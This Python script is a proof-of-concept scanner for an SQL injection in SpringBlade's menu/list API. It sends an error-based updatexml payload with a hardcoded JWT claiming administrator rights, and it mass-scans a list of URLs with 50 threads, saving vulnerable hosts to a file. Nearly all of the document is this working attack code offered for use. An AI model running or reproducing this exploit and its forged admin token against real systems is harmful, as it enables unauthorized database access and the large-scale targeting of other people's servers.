#SpringBlade api/blade-system/menu/list接口存在SQL注入漏洞
import requests,argparse,sys,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() 
def poc(target):
    payload="/api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1"
    headers1={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    hearders2={
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Blade-Auth": "bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ" 
    }
    try:
        res1=requests.get(url=target,timeout=5,verify=False,headers=headers1)
        if res1.status_code ==200:
            res2=requests.get(url=target+payload,timeout=5,verify=False,headers=hearders2)
            result=json.loads(res2.text)["msg"]
            if 'c4ca4238a0b923820dcc509a6f75849' in result:
                print(f"[+]{target}存在sql注入")
                with open('h.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target}不存在sql注入")
        else:
            print(f"[*]{target}访问有问题，请手工访问")
    except:
        pass
def banner():
    pass
def main():
    parse=argparse.ArgumentParser(description="SpringBlade api/blade-system/menu/list接口存在SQL注入")
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args=parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp=Pool(50)
        mp.map(poc,url_list)
        mp.close
        mp.join
        
    else:
        print(f"Usage: Python {sys.argv[0]}  -h")
if __name__ =="__main__":
    main()
